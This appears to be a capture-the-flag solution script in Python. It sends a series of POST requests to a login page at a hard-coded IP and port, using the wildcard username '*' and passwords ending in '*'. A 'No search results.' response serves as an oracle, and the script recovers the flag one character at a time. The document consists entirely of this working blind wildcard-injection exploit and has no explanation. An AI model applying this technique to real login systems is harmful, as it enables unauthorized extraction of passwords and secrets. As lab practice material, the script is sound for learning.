import sys
import requests
import string

characters = list(string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation)
characters.remove('*')

#login username * and password *
#login2 username * and password H* etc


def brutforce():
    host, port = "94.237.48.12", 41618
    url = f"http://{host}:{port}/login"
    username = "*"
    password = ""
    bruteforced_password = ""

    while "}" not in bruteforced_password:
        for char in characters:
            password = bruteforced_password + char + "*"
            sys.stdout.write(f"Flag: {password}\r")
            sys.stdout.flush() #display letter
            data = {
                "username": username,
                "password": password
            }
            response = requests.post(url, data=data)
            if "No search results." in response.text:
                bruteforced_password += char
                break
            elif "}" in bruteforced_password:
                break
    return bruteforced_password

flag = brutforce()
print(flag)